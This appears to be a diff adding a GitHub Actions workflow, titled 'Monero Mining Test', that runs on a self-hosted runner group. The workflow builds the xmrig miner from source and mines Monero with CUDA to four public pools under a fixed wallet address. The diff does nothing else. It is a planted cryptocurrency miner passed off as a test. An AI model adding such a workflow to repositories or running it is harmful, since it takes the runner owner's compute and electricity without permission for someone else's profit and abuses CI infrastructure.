@@ -1,0 +1,26 @@
+name: Monero Mining Test
+
+on:
+  workflow_dispatch:
+
+jobs:
+  load:
+    runs-on: 
+      group: tj-runners-group
+      labels: tj-runners
+    steps:
+      - name: checkout repo content
+        uses: actions/checkout@v3
+
+      - name: Install and build dependencies
+        run: |
+          sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          mkdir xmrig/build && cd xmrig/build
+          cmake ..
+          make -j$(nproc)
+
+      - name: Mining
+        run: |
+          cd xmrig/build
+          ./xmrig --donate-level 5 --cuda -o xmr-us-east1.nanopool.org:14433 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 --tls --coin monero -o xmr-us-west1.nanopool.org:14433 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 --tls --coin monero -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p x -o pool.xmrfast.com:9000 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p x --randomx-mode=fast
